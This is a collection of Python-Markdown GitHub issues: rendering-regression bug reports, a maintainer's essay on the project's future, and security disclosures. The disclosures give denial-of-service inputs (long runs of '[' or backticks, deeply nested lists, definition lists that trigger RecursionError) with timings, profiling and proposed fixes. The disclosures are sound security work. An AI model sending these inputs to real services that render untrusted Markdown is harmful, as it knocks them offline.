## Problem description Enabling the `toc` extension together with `attr_list` raises an unhandled `TypeError` for any heading that carries a bare (valueless) attribute — the simplest case being `{id}`: ```python import markdown from markdown.extensions import attr_list, toc markdown.markdown( "#d {id}", extensions=[attr_list.AttrListExtension(), toc.TocExtension()], ) ``` ``` Traceback (most recent call last): File "markdown/extensions/toc.py", line 417, in run 'id': unescape(el.attrib["id"]), ... File "markdown/treeprocessors.py", line 470, in unescape return self.RE.sub(self._unescape, text) TypeError: expected string or bytes-like object, got 'NoneType' ``` ## Steps to reproduce See above — current `main` (a4d4428), Python 3.13. ## What happens `attr_list` supports bare attributes (`{attr}` → valueless HTML attribute) and implements them with `elem.set(name, None)`. For a heading, `toc`'s treeprocessor then runs: ```python if "id" not in el.attrib: # "id" IS in attrib — with value None el.attrib["id"] = unique(...) # so the slug is never generated ... 'id': unescape(el.attrib["id"]), # unescape(None) → TypeError ``` The `id` attribute exists but has the value `None`, so toc skips generating a slug for it and later passes the `None` to `re.sub`. With only `attr_list` (no `toc`) the same input renders `

d

`, i.e. the attribute really is valueless — which as an HTML id is no id at all. ## Expected behavior A valueless `id` should be treated like a missing id: the toc extension should generate a slug id (and an anchor) for the heading instead of crashing. `#d {id}` should render like any other heading with no explicit id. Found by mutation-fuzzing the parser with the bundled extensions enabled. I used AI to assist me with this report.

items.body:
## Describe the bug

The `def_list` extension raises an uncaught `RecursionError` on a flat document of term/definition pairs without blank lines between them:

```python
import markdown
markdown.markdown('term\n: definition\n' * 600, extensions=['def_list'])
# RecursionError: maximum recursion depth exceeded
```

Each `term\n: definition` pair nests the remainder of the document one definition level deeper, so a document of only ~5 KB (linear in nesting depth) reaches the interpreter's recursion limit. `DefListProcessor.run` calls `parseBlocks` on the definition content, which contains the remaining pairs, and `DefListProcessor.test` has no recursion-limit guard.

Blockquotes are already guarded against this (`BlockquoteProcessor.test` checks `util.nearing_recursion_limit()`), and #1679 tracks the same class for lists (PR #1685). Definition lists are the remaining unguarded recursion.

## Expected behavior

Nesting stops short of the recursion limit, keeping the remaining markers as text, the same way blockquotes and lists behave.

## To Reproduce

1. `markdown.markdown('term\n: definition\n' * 600, extensions=['def_list'])`
2. Observe `RecursionError: maximum recursion depth exceeded`
items.title: def_list extension: uncaught RecursionError (DoS) on flat term/definition pairs

items.body:
Hello, after rebuilding one of my Mkdocs sites that use Python-Markdown, I noticed some bold links broke (they worked OK before): ```md - __[:material-language-markdown-outline: Python Markdown](https://python-markdown.github.io/){:target="_blank"}__: processador de Markdown per a Python. ``` I asked a LLM to help me figure it out, and it pointed me here. Below, I attach what the LLM figured out. --- ## Summary Since 3.11.1, `__strong__` text is no longer rendered as strong when it contains a single underscore at the start of a word. Depending on the content, the delimiters are either left as literal text or rendered as nested `` elements with a stray `_`. A common way to hit this is a link with `{target="_blank"}` inside strong text, because emphasis is processed while the attribute list is still plain text. The same text using `**` still renders as strong. ## Minimal reproduction ```python import markdown print(markdown.markdown('__foo _bar__')) print(markdown.markdown('__[A](u){target="_blank"}__: x', extensions=['attr_list'])) ``` Output on 3.11.2 and on `master` (`0bfd8c3e`): ```html

_foo bar

__A__: x

``` Output on 3.10.3 and 3.11.0: ```html

foo _bar

A: x

``` ## Version comparison Reproduced with Python 3.14. Only the `attr_list` cases have an extension enabled. | Input | 3.10.3 | 3.11.0 | 3.11.1 | 3.11.2 | `master` | | --- | --- | --- | --- | --- | --- | | `__foo _bar__` | Strong | Strong | Nested `` | Nested `` | Nested `` | | `__a _b__ c` | Strong | Strong | Nested `` | Nested `` | Nested `` | | `__a "_b" c__ d` | Strong | Strong | Nested `` | Nested `` | Nested `` | | `__[A](u){target="_blank"}__: x` | Strong | Strong | Literal `__` | Literal `__` | Literal `__` | | `**[A](u){target="_blank"}**: x` | Strong | Strong | Strong | Strong | Strong | ## Expected behavior I expected the output from 3.11.0 and earlier: the outer `__` pair renders as ``, and the unmatched `_` stays as literal text. ## Context The version comparison points to the emphasis rewrite in #1632, which first shipped in 3.11.1. I did not bisect to the individual commit. #1630 is related, as it covers underscores in `{target="_blank"}` affecting italic text. A comment there notes that emphasis runs before attribute lists, so underscores sometimes need escaping. Escaping does work here (`{target="\_blank"}`), and so does moving the strong markers inside the link (`[__A__](u){target="_blank"}`). However, the `__foo _bar__` case involves no attribute list, and existing documents that rendered correctly through 3.11.0 change silently on upgrade. #1657 restored earlier behavior for a similar compatibility change, so I wanted to ask whether this one is intended. I found this in a MkDocs-style documentation site, where a list of links in the form `__[Name](url){:target="_blank"}__: description` lost its bold formatting after a dependency update.

items.body:
This project first started nearly two decades ago, when there were only a few clones of the original Perl implementation of Markdown. It was created as a direct clone, which copied the basic parsing structure of the Perl code. In essence, the code consisted of a series of regular expressions that were run in a specific order. Since then, this library has been expanded and adapted in various ways, most notably with an extension API, which allows third-party extensions to insert their own regular expressions into the series. Since then, the Markdown community has expanded and grown, CommonMark was defined and implemented, and the way that modern Markdown parsers work is very different under the hood. From time to time, we have considered updating our core by abandoning the current structure and using one of these more modern methods. However, we have not done so as that would require us to abandon support for all/most of the existing third-party extensions. Additionally, because of its core structure, it is not practical to adapt this library to become a modern (CommonMark?) parser. 

After CommonMark began to gain traction, I assumed that users would abandon this project in favor of CommonMark. However, at least in Python, the various CommonMark libraries seem to have not gained much traction either due to lack of an extension API, or a lack of available extensions where an API exists. For that reason, Python Markdown continues to be the most popular Markdown implementation in Python by a large margin. Therefore, Python users can't use extensions with a modern parser, and when they want to use extensions, they don't get a modern parser.

Most recently, this library has received an explosion of bug reports for obscure inputs, which causes the running time of the parser to grow exponentially. When these issues were raised in the past, they were dismissed as so obscure that no reasonable human would ever create that input. However, with today’s readily available AI tools, anyone can prompt a tool to create input that could easily be used in a denial-of-service attack. These same tools can even find new attack vectors when the existing ones have been patched. Therefore, these reports can no longer be ignored. Most of these bug reports are due to basic usage of Python's regular expressions, and can be tied to the underlying core structure of our code. It is not sustainable to continue to patch each and every one of these piecemeal as we have been doing in recent months. The only way to properly mitigate these sorts of issues would be to use a modern parser, which brings us back to the lack of extension support.

On the one hand, it seems like this library is not long for this world. On the other hand, there continues to remain a need for the extension support that this library provides. Given the above, there are a few different ways that things could move forward.

1. We could continue to maintain the existing library, but include clear warnings that it should only be used for documents from a trusted source. In other words, we would warn users that they should not use this library to parse Markdown content provided by untrusted sources, such as comments, forum posts, and the like.
2. An existing modern implementation could be found and work could be done to implement many of the popular extensions to work with that library.
3. A new implementation could be built from the ground up. Then, various popular extensions could be developed on top of it.

To be clear, personally, I do not have the bandwidth to pursue any of those options except the first one. That said, I think that one of options 2 or 3 would be better for users overall. I just don't know when or how the work will get done.

Regarding option 1, it does not seem too far-fetched when you consider that the primary use case for many of our users is as a static site generator (i.e., MkDocs and its clones). In that use case, the entire Markdown content is being parsed either locally or on a CI server prior to it being posted live as rendered content. The only attack vector is if the source code for a given project was available on a public repository and someone submitted a pull request which would trigger one of these lengthy parsing sessions. But even then, the worst-case scenario is that the CI server would time out, causing the maintainer of the project to look more closely at the submitted code and reject it. No threat of a denial-of-service attach there.

The primary concern with option 1 is that the library is used in other contexts. For example, last time I checked, Django was still using Python Markdown to parse user-supplied Markdown comments, among many other use cases that a full-fledged web framework can address. That said, I can't imagine that these use cases make extensive use of third-party extensions. Therefore, it would not be terribly painful for users to have to switch to a different implementation in those instances. However, users would understandably be frustrated if they needed to continue using our library to support third-party extensions for their blog post, but a different implementation to parse user-submitted comments on that same blog post.

What is clear to me is that there is no great option going forward. However, the current pace of obscure bug reports is unsustainable, and for that reason, the future of this project is not clear to me. Something needs to give.

## Summary An indented (i.e. within the multi-line content of another footnote) footnote definition is silently dropped from the output. If the nested footnote is also referenced anywhere, the rendered reference links to a `#fn:` anchor that never exists in the document (a dead internal link). Un-indented nested definitions (in the same block as the parent) work correctly and are tested, so only the indented/multi-line variant is affected. ## Repro ```python import markdown text = """\ Main[^1]. [^1]: First [^2]: Second """ print(markdown.markdown(text, extensions=['footnotes'])) ``` Expected (per the documented nested-footnote behavior, see the existing `test_footnote_reference_within_footnote_definition` which nests the definition un-indented): `[^2]` should render as its own footnote item (`
  • `). Actual (Python-Markdown 3.10): the `[^2]: Second` line disappears completely — neither footnote content nor a `fn:2` anchor is emitted: ```html

    Main1.

    1. First ↩

    ``` If the parent footnote also references it (`[^1]: First [^2]`), the output contains `href="#fn:2"` and `id="fnref:2"` but no `id="fn:2"` target — a broken link plus silent data loss of the definition text. ## Root cause `FootnoteBlockProcessor.detectTabbed()` (`markdown/extensions/footnotes.py`) collects each 4-space-indented block as content of the parent footnote, but it runs `self.RE.search(block)` on the **still-indented** block. The definition regex `^[ ]{0,3}\[\^([^\]]*)\]:` therefore never matches an indented `[^2]: ...` line, so the whole line is appended to the parent footnote's content. Later, when the parent footnote's content is re-rendered internally, `FootnoteBlockProcessor.run()` strips the indent via `detab()` and *does* match the line as a definition — it is removed from the content and stored in the footnote registry at a point where the footnote `
    `/`
      ` structure has already been generated, so the nested definition is never rendered. Content silently lost; anchor never created. ## Environment - Python-Markdown: main branch (3.10) - Python: 3.13

items.body:
### Summary

`markdown.markdown()` raises an uncaught `RecursionError` on a deeply nested list. The input is small and plausible as user-submitted content, so any service that renders untrusted Markdown (comments, wikis, issue trackers) can be crashed by it. This is the same class as CVE-2025-69534 (#1534) — an uncaught exception reached while parsing untrusted input — with a different trigger.

### Reproduce

```pycon
>>> import markdown
>>> doc = "".join("  " * i + "- x\n" for i in range(600))   # ~6 KB, 600 nested bullets
>>> markdown.markdown(doc)
Traceback (most recent call last):
  ...
  File ".../markdown/blockprocessors.py", line 411, in run
    self.parser.parseBlocks(lst[-1], [item])
  File ".../markdown/blockprocessors.py", line 197, in run
    self.parser.parseBlocks(parent[-1], [block])
  ...
RecursionError: maximum recursion depth exceeded
```

It crashes from a depth of roughly 500 on CPython's default limit. Ordered lists (`1. x`) trigger it the same way. The recursion alternates between `OListProcessor.run` and `ListIndentProcessor.run`, one frame pair per level of indentation.

### Why this looks like a gap rather than an inherent limit

The project already has a mechanism for exactly this, and already applies it to the other block type that recurses per level — blockquotes:

```python
# markdown/blockprocessors.py, BlockQuoteProcessor
def test(self, parent, block):
    return bool(self.RE.search(block)) and not util.nearing_recursion_limit()
```

With that guard, a 2000-deep blockquote renders fine instead of crashing:

```pycon
>>> len(markdown.markdown(">" * 2000))   # guarded: no crash
14861
```

`#799` (the blockquote version of this report) was fixed this way. The list processors — `ListIndentProcessor`, `OListProcessor`, `UListProcessor` — all recurse through `parseBlocks`/`parseChunk` but none calls `nearing_recursion_limit()`, so the list path still overflows.

### A note for whoever fixes it

The obvious one-line change — adding `not util.nearing_recursion_limit()` to `ListIndentProcessor.test()` — does stop the `RecursionError`, but I found it then exposes a slow degraded path: a 2000-deep indented block takes many seconds rather than rendering promptly, where the blockquote guard degrades cleanly. So the list case seems to need a little more than copying the guard verbatim, which is why I am reporting it rather than sending a patch I am not confident in. Happy to help test a fix.

### Environment

- Python-Markdown `master` (3.11.x) and 3.11.2 on PyPI
- CPython 3.12, Ubuntu 24.04

### Severity

Denial of service: a small, plausible input (a few KB of nested list markers) crashes the parser with an uncaught exception, affecting any caller that renders untrusted Markdown.

Since 3.11, a backtick string that has no closing string of the same length causes the text that follows it to be dropped. In 3.10.3 the backticks are output literally and no text is lost. Input: ``` a ``` b ````` c ``` Actual output (3.11, 3.11.1, 3.11.2 and current master `b41e0aa`): ```html

a c

``` Expected output (3.10.3): ```html

a ``` b ````` c

``` Two more inputs that show the same behavior (input, then 3.11.2 output, then 3.10.3 output): ~~~ `a`` b

b

`a`` b

~~~ ~~~ ```abc`````

c

```abc`````

~~~ In each case the text after the opening backticks is lost (`b`, `a` and `ab` above), so the rendered document no longer contains content that is in the source. According to the [syntax rules] a code span is opened and closed by backtick strings of equal length; a backtick string that is not matched should be output literally, as 3.10.3 did. I bisected this to 7be0cff (#1618, "Fix excessive backtracking when matching inline code blocks"). Its parent bb50627 gives the expected output for all three inputs and 7be0cff gives the output above. The later rewrite in 8a9ae23 (#1625) did not change the result. To reproduce, run `markdown.markdown("a ``` b ````` c")` with no extensions. [syntax rules]: https://daringfireball.net/projects/markdown/syntax#code AI disclosure: I used Claude Code (Anthropic) to run the comparison across versions, to bisect the regression to a commit, and to draft the text of this issue. I checked the inputs and outputs above myself before submitting.

# Summary After upgrading from Python-Markdown 3.11.0 to 3.11.1, emphasis is no longer rendered when its content ends with punctuation and the closing `**` is immediately followed by ordinary text. I traced the behavior change to commit `6f825aa753d672ec2d8ec5bc7b70d14b919d2fe1` in #1632. I understand from the discussion there that the punctuation-aware delimiter rules were deliberately added. This report asks whether the resulting loss of compatibility is intended, and whether there is an acceptable way to preserve the earlier behavior. # Minimal reproduction ```python import markdown print(markdown.markdown("**단어(설명)**입니다.")) ``` Actual output in 3.11.1: ```html

**단어(설명)**입니다.

``` Expected output, matching 3.10.3 and 3.11.0: ```html

단어(설명)입니다.

``` # Version comparison The following results were reproduced with Python 3.14.0 using the source from each release tag and `master` at `2258b48e551d0df7b149ea9c33969bea7c7a0a2b`, without extensions. | Input | 3.10.3 | 3.11.0 | 3.11.1 | | --- | --- | --- | --- | | `**단어(설명)**입니다.` | Strong | Strong | Literal | | `**term(test)**suffix` | Strong | Strong | Literal | | `**用語(test)**です` | Strong | Strong | Literal | | `**术语(test)**是` | Strong | Strong | Literal | | `**term(test)** suffix` | Strong | Strong | Strong | | `**term**suffix` | Strong | Strong | Strong | Here, “Strong” means the intended content is wrapped in ``, and “Literal” means the `**` markers remain in the output. The issue is not specific to Korean or parentheses. For example: ```python import markdown print(markdown.markdown("**term.**suffix")) print(markdown.markdown("**term。**suffix")) print(markdown.markdown("**term😀**suffix")) ``` Actual output in 3.11.1: ```html

**term.**suffix

**term。**suffix

**term😀**suffix

``` Expected output, matching 3.11.0: ```html

term.suffix

term。suffix

term😀suffix

``` # Impact In Korean, grammatical particles and endings are normally attached directly to the preceding expression. Emphasizing a term with a parenthetical explanation therefore naturally produces input such as `**단어(설명)**입니다.`. Requiring a space at that boundary changes how the sentence is written. Existing documents that rendered emphasis before the upgrade now display literal Markdown markers. Similar constructions can occur in other languages, as the examples above show. # Questions - Is the loss of emphasis in these previously supported constructions an intended compatibility change? - Would you consider restoring the earlier behavior for these cases, or providing an opt-in compatibility setting or supported extension approach?

items.body:
Hi,

There are two quadratic scan functions in inlinepatterns.py, reachable by six different
payload shapes. On most of them the work is discarded, so it is pure waste. One line of
input is enough.

## Scanner one: LinkInlineProcessor.getText, inlinepatterns.py:884

    def getText(self, data: str, index: int) -> tuple[str, int, bool]:
        """Parse the content between `[]` of the start of an image or link
        resolving nested square brackets.
        """
        bracket_count = 1
        text = []
        for pos in range(index, len(data)):
            c = data[pos]
            if c == ']':
                bracket_count -= 1
            elif c == '[':
                bracket_count += 1
            index += 1
            if bracket_count == 0:
                break
            text.append(c)
        return ''.join(text), index, bracket_count == 0

Two things combine.

When the brackets never balance the loop runs all the way to len(data), one Python level
text.append(c) per character. There is no early exit for the case where there is no "]"
left in the input at all, so an unmatched "[" always costs a full scan of everything after
it.

And the result is then thrown away. handleMatch at :934 does:

    text, index, handled = self.getText(data, m.end(0))
    if not handled:
        return None, None, None

So the multi thousand character list that was just built and joined is discarded, and the
pattern is retried at the next "[". N unmatched brackets cost N full scans.

getText is inherited by six processors: Link, Reference, ShortReference, Image,
ImageReference and ShortImageReference. Each one calls it on the same data.

## Scanner two: BacktickInlineProcessor.find_code_spans, inlinepatterns.py:445

This one makes no getText calls at all, so it is independent.

    def find_code_spans(self, start: int, text: str) -> tuple[int, int] | None:
        last = len(text)
        ...
        i = start
        while i < last:
            span_length = 0
            while i < last and text[i] == '`':
                span_length += 1
                i += 1
            ...
            if max_ticks == span_length:
                return start, i - span_length
            if span_length > longest_span:
                longest_span = span_length
                end = i

Same shape. When no span of matching length exists, "while i < last" runs to the end of the
text, and it is re-entered once per backtick position.

## Repro

    python3 -c "import markdown,time; p='['*30000; t=time.perf_counter(); markdown.Markdown().convert(p); print(time.perf_counter()-t)"

127 seconds here on 3.11. For a quicker check, '['*10000 is about 13 seconds.

## The curve, measured

"[" * n, one line, nothing else. Fresh subprocess per row.

     input B       sec   us per B   output B
       2,501      0.77        307      2,508
       5,001      3.02        603      5,008
      10,001     13.02      1,302     10,008
      15,001     30.37      2,024     15,008
      20,001     52.39      2,619     20,008
      30,001    126.99      4,233     30,008

Fitted exponent 2.06, per byte cost growth 13.8x. Output matches input on every row.

I stopped at 30 KB because that is already two minutes. Projecting from the last measured
point gives roughly 25 minutes at 100 KB and roughly 48 hours at 1 MB, but those are
projections and the 127 seconds is the measurement.

## Six shapes, and the scan constant is the processor count

Sweeping every inline construct that has an opener needing a closer, sizes 250 to 4,000,
bare and with extra/admonition/sane_lists/toc loaded:

    shape              payload            exponent   sec at n=4000   input B
    image_mixed        "![[" * n              1.89           11.82    12,001
    ref_open           "[a][" * n             1.99            6.46    16,001
    image_open         "![" * n               1.99            5.16     8,001
    footnote_open      "[^" * n               1.97            3.86     8,001
    bracket_balanced   "["*n + x + "]"*n      2.06            3.55     8,001
    bracket_open       "[" * n                2.07            2.18     4,001
    backtick_open      "`" * n                2.06            0.37     4,001

Then I instrumented the scanners and counted characters, at n=1,000:

    shape            getText calls   chars scanned   scan/n^2   resolved   processors
    bracket_open             3,000       1,501,500       1.50          0   Link, Reference, ShortReference
    image_open               3,000       3,000,000       3.00          0   Image, ImageReference, ShortImageReference
    footnote_open            3,000       3,003,000       3.00          0   Link, Reference, ShortReference
    ref_open                 5,000       5,001,500       5.00      2,500   Link, Reference, ShortReference
    image_mixed              6,000       9,000,000       9.00          0   all six
    backtick_open                0               0          0          0   none, separate path

scan/n^2 is an exact constant at every size, so this is precisely quadratic rather than
something that merely looks steep on a chart. And the constant is just how many processors
the payload gets to call getText: "![[" triggers all six, which is why it is the worst per
byte.

The resolved column is 0 everywhere except ref_open. So on five of the six shapes not one
call resolves, and every byte scanned and every character appended is discarded.

cProfile agrees. "[" * 4000, sorted by tottime:

      ncalls   tottime   cumtime   function
       12000     3.579     5.395   inlinepatterns.py:884(getText)
    24006041     1.737     1.737   {method 'append' of 'list' objects}
        8000     0.012     3.580   inlinepatterns.py:934(handleMatch)

And "`" * 6000:

      ncalls   tottime   cumtime   function
        6000     0.763     0.764   inlinepatterns.py:445(find_code_spans)
        6000     0.002     0.767   inlinepatterns.py:491(handleMatch)

## What is NOT affected

Worth saying, because it narrows the fix. These were all linear in the same sweep:
star_open, star_balanced, under_open, strong_star, strong_under, tilde, tilde_pairs, caret,
equals, amp, amp_entityish, backslash, attr_open, pipes, ref_pairs, angle_open, and a plain
text control.

So emphasis is fine here, which is notable because emphasis is one of the axes Mistune was
hit on. The only mildly super-linear thing I found outside the six was "<a" * n at exponent
1.56, and I do not think that is worth your time.

## While I was there: block level quadratics, and one uncaught exception

The sweep above was inline patterns only, so I ran the same method over block constructs and
the extensions. Sizes 4k to 64k, five points each, each extension loaded individually so the
attribution is unambiguous, and every shape re-run bare so "extension X is quadratic" is
only claimed where bare is linear.

    shape            config    exponent   worst
    atx headers      toc           2.01   64.21s at 63,999 B
    setext headers   toc           1.96   35.65s at 63,995 B
    ref definitions  BARE          1.94    3.79s at 71,379 B
    setext headers   BARE          1.90    7.83s at 63,995 B
    abbr definitions abbr          1.84    8.02s at 68,705 B
    atx headers      tables        1.80    5.74s at 63,999 B
    atx headers      smarty        1.50    3.15s at 63,999 B

Two things to pull out of that.

**toc is the worst single thing I found anywhere in this work.** 8,000 ATX headers, 64 KB,
64.2 seconds, exponent 2.01. Bare markdown does the same document in 0.239 seconds, so the
extension is adding a clean quadratic. I did not dig into which part, but the usual cause
for a headers-versus-headers quadratic is slug uniquification comparing each new slug
against every previous one.

**Reference definitions and setext headers are quadratic in CORE**, with no extension
loaded, which means every consumer is exposed to those two. They are milder than the bracket
scanners per byte, but they need no opt-in.

I left one shape out on purpose. A run of "- - -" looked quadratic bare, but "- - -" can
parse as nested list items as well as a thematic break, so I could not attribute it cleanly
and I am not claiming it.

### The uncaught exception, which is a different defect class

Before the measurement, your own documented goal. docs/index.md lists this FIRST under
Goals, and the parenthetical is the relevant part:

    Maintain a Python library (with an optional CLI wrapper) suited to use in web
    server environments (never raise an exception, never write to stdout, etc.) as
    an implementation of the markdown parser that follows the syntax rules and the
    behavior of the original (markdown.pl) implementation as reasonably as possible

"Never raise an exception", for "web server environments". That is the property the next
measurement refutes, and it is also the reason this belongs in a security report rather
than an issue: you have told people they can point this library at a web request, and the
goal that makes that safe is the one that does not hold.

With def_list loaded, or with extra, which bundles it:

    496 definition entries, 5,345 B -> renders fine
    497 definition entries, 5,356 B -> RecursionError

    python3 -c "import markdown; print(markdown.Markdown(extensions=['extra']).convert(chr(10).join(f't{j}{chr(10)}:   d' for j in range(497))))"

The RecursionError propagates straight out of md.convert(). I checked: it is not caught and
converted into anything, it escapes. Default recursion limit here is 1000, and the threshold
is sharp at 497, which is consistent with about two frames per entry.

So 5.4 KB of entirely ordinary looking markdown, a definition list with 497 terms, crashes
the renderer. For anything rendering user supplied markdown in a request that is a 500
rather than a slow response.

I am including it here because you already treat this class as a security issue in this
library: CVE-2025-69534 is "Python-Markdown has an Uncaught Exception", where malformed HTML
like sequences raised an unhandled AssertionError, fixed in 3.8.1. This is the same shape
with a different trigger.

## Suggested fix

The cheap guard handles the worst case in getText. Before the loop, if there is no "]"
anywhere after index then the brackets cannot balance:

    if data.find(']', index) == -1:
        return '', index, False

That turns "[" * n from quadratic into linear.

It does not fix every shape, because bracket_balanced and ref_open do contain closing
brackets and are still quadratic. The complete fix is to stop rescanning from scratch at
every candidate, for instance by hopping with str.find instead of a per character Python
loop, and by not building text until the match is known to resolve. Building a string that
gets discarded on the failure path is waste regardless of the complexity question.

find_code_spans needs the same treatment: it can precompute the backtick run positions once
per text rather than rescanning from each opener.

Because five of the six shapes funnel through one function, a fix in getText covers most of
this at once.

## I tested the same payloads against cmark-gfm, and they are linear there

This is not theoretical, and it is the reason I think the fix is worth doing rather than
documenting as a known limit.

Earlier in the same work I swept cmark-gfm, compiled to WebAssembly, over 26 payload shapes
at sizes from 250 bytes to 256,000 bytes. The shapes included open bracket runs, bracket
pairs, unclosed links, backtick runs, nested blockquotes, nested lists and many reference
definitions, which is the same family I am reporting here.

Every one was linear. Per byte cost stayed flat across a 1,000x size range.

So a C markdown parser handles these exact inputs in linear time, after it was hit by
CVE-2023-22486 and added dedicated quadratic fuzzers in 2023. The inputs are not
pathological in some unavoidable way, they are pathological for this implementation.

## Prior art

I checked before writing. The same mechanism has a CVE in two sibling projects:

Mistune, CVE-2026-49851, fixed in 3.3.0: "Under specific conditions involving dense,
unmatched nesting of opening square brackets, the parser fallback loops degrade from linear
execution time to a worst-case quadratic complexity."

cmark-gfm, CVE-2023-22486, fixed in 0.29.0.gfm.7: "Quadratic complexity bug in
handle_close_bracket may lead to a denial of service."

The python-markdown CVE I could find, CVE-2025-69534, is a different bug: malformed HTML
like sequences causing an unhandled AssertionError in html.parser, fixed in 3.8.1. I could
not find any python-markdown advisory for quadratic bracket or backtick parsing.

## Honest limits

CPU only. Peak memory stays between 0.3 and 0.6 MB on every arm.

Severity depends on the consumer's input cap and the library has none of its own, so I
cannot give you a single number. I found this while measuring Zulip, where messages are
capped at 10,000 characters and rendering is wrapped in a 5 second timeout, so there it
burns the budget and gets killed. Applications without a cap or a timeout are worse off, and
30 KB is a perfectly ordinary document size.

The payloads are visually obvious, a line of "[" or backticks, so a content check could
block these exact shapes. That does not fix the complexity.

Measured on Python 3.13.14 on Windows with Markdown 3.11 from PyPI. Absolute times will
differ on other platforms. The scan/n^2 constants are character counts, so those do not
depend on the platform.

Thanks,
furkan

--

A 30,001 byte document consisting of "[" characters takes 126.99 seconds to render on
current 3.11. The output is the same size as the input, so the parser spends two minutes
and produces nothing. Fitted exponent across the range is 2.06, so it is quadratic, and I
measured that rather than projecting it.

There are two independent quadratic scanners behind this and six payload shapes that reach
them. The worst per byte is "![[" repeated, which persuades all six inline processors to
scan the remaining text, giving 9 times n squared characters scanned.

I instrumented the scanners and counted. The characters scanned come to exactly 1.50, 3.00,
5.00 or 9.00 times n squared depending on the shape, with the constant being simply how
many processors the payload triggers. On five of the six shapes every single call fails to
resolve, so 100% of the scanning and string building is thrown away. At n=4,000 that is
24,006,041 list appends.

How bad this is depends on the consumer, and I want to be straight about that, because the
library has no input size limit of its own. The ceiling is whatever the application
accepts. 30 KB is an ordinary README. A wiki page, a pull request description, a docs
build, or a comment field with no cap gets the full quadratic. Zulip, where I found this,
caps messages at 10,000 characters and wraps rendering in a 5 second timeout, so there an
attacker burns the whole budget and the request is killed, which is a much softer landing
than an uncapped consumer gets.

This is CPU only. Peak memory stays under 1 MB on every arm, so it is not memory
exhaustion.

Two more things from the same sweep.

The first one goes against your own stated goal, which is why I am leading with it. Your
docs/index.md lists this first under Goals:

  "Maintain a Python library (with an optional CLI wrapper) suited to use in web server
   environments (never raise an exception, never write to stdout, etc.)"

With def_list loaded, or with extra which bundles it, a definition list of 497 terms in
5,356 bytes makes md.convert() raise an uncaught RecursionError. 496 terms renders fine, so
the threshold is sharp. That is a crash rather than a slowdown, a 500 for anything rendering
user markdown in a request, and it is the same class as CVE-2025-69534 which you already
fixed as a security issue. I am not reading "never raise an exception" as a promise you broke
on purpose, I am pointing out that the goal and the deployment context it names are exactly
what makes this a security issue rather than a bug report.

Second, the toc extension has a quadratic worse in absolute terms than anything else here:
8,000 ATX headers in 64 KB takes 64.2 seconds, against 0.239 seconds for the same document
with no extensions loaded.

The bracket mechanism already has a CVE in two sibling projects. Mistune fixed it in 3.3.0 as
CVE-2026-49851, described as "dense, unmatched nesting of opening square brackets"
degrading "to a worst-case quadratic complexity". cmark-gfm fixed it in 0.29.0.gfm.7 as
CVE-2023-22486, "Quadratic complexity bug in handle_close_bracket". python-markdown looks
like the one that did not get the fix, and I checked that directly rather than inferring it:
I ran the same payloads through cmark-gfm from 250 bytes to 256,000 bytes and every one was
linear.
items.title: Two quadratic scanners in python-markdown let one 30 KB document cost two minutes of CPU, and all the work is discarded

items.body:
Should we add an interactive demonstration to the documentation and if so, what form should it take?

First, some background: Back in 2012 I had created a small one-page site which replicated the demo on [daringfireball.net](https://daringfireball.net/projects/markdown/dingus), which is currently hosted at <https://waylan.pythonanywhere.com/dingus> (I expect that to go away soon and the link will be dead). The old tool used a traditional Python server to accept a POST request and rebuild the page with the rendered Markdown included (the code is preserved [here](https://github.com/Python-Markdown/dingus/tree/bottle)). Recently, I updated the tool to use [Pyodide](https://pyodide.org/), which runs a Python instance directly in the browser. The new site is a single page app which runs completely in the browser, no server needed once the page is loaded (I have had a local instance running in a browser tab for a week after terminating the dev server). Code is at [Python-Markdown/dingus](https://github.com/Python-Markdown/dingus) and you can see a demo at <https://dingus.python-markdown.workers.dev/>.

As I was working on an update to the documentation for this project (#1627) it occurred to me that we could include a demo right in the documentation now that no server component is needed. My question is: what form should the demo be? There are a few options:

1. Copy the existing solution into the docs as-is. This would work but would not match the site's style.
2. Reimplement in the style of the site. We could even use [Content Tabs](https://zensical.org/docs/authoring/content-tabs) to switch between the source, raw output, and preview.
3. Implement a Python console. Basically, slightly modify [Pyodide's example](https://pyodide.org/en/stable/examples/console_webworker.html) to have it preinstall Python-Markdown and some common extensions (such as PyMdown) so that users can import and run the library in their browser.

I started to build Option 2 as part of #1627, but backed it out as it was getting complicated and makes more sense as a separate PR. My thinking is that I would like to give users the option to play with the config options. The existing solution only allows enabling extensions, but there is no way to set config options. Therefore, I was thinking option 2 could include a fourth tab which provided the user with an editable YAML or JSON file to define all of the keyword arguments to pass into `markdown.markdown`. But then we would need to build the in-browser code to process and error-handle that along with documentation for is. I also considered just creating a form for all of the options. but that would limit options to what is explicitly implemented. Then it occurred to me that Option 3 was possible. That would let users try writing the code themselves without the need to set up any environment or install any tools. It would also give users the ability to fully customize any option (such as the toc slugify option which accepts a Python callable; a YAML parser would need to be "safe" in this environment and wouldn't be able to support that). The console is sandboxed and users would only be able to import the libraries we preselect (in addition to the list of libs provided by Pyodide by default). The console would also not persist across sessions and therefore would not be sharable by multiple users. We could incorporate a copy-to-clipboard and/or download-to-file button for users to easily save their work and/or copy to a bug report. One thing the console would not do is display an in-browser preview (I am not interested in reimplementing Python-notebook; although, if some already did, that might be a better solution...).

I like Option 3 as we are a library first. Option 3 is directly targeted at developers. And it would encourage bug reports which include console sessions (and therefore would clearly include all config options that the user is using). That said, a significant portion of our users are not Python developers, but users of MkDocs, Zensical and the like. Those users could be intimidated by a console, but might be very comfortable with a YAML/JSON config. Many would likely prefer Options 1 and 2. 

One final thought: Yes, we could offer both a console and non-console options, but if we went that route, then my inclination would be to do the console (Option 3) and leave the existing tool at <https://dingus.python-markdown.workers.dev/> in place.

Before I spend any more time on Option 2, I thought I would ask for feedback from others. Is there anything obvious I am missing? Or maybe someone knows of a serverless (fully in-browser) Python-Notebook-like-implementation we could incorporate.

# Python-Markdown — backtick code-span ReDoS

**Package** `markdown` / Python-Markdown 3.10.3 (PyPI, latest) · **CWE-1333 / 400** · **CVSS 3.1 7.5** (`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`) · **Prior CVEs** none for this (distinct from CVE-2025-69534, an HTMLParser `AssertionError` fixed in 3.8.1)

## Abstract

Python-Markdown matches inline code spans with one regex, `markdown.inlinepatterns.BACKTICK_RE`, that uses a **back-reference** for the closing run of backticks:

```python
BACKTICK_RE = r'(?:(?<!\\)((?:\\{2})+)(?=`+)|(?<!\\)(`+)(.+?)(?<!`)\2(?!`))'
```

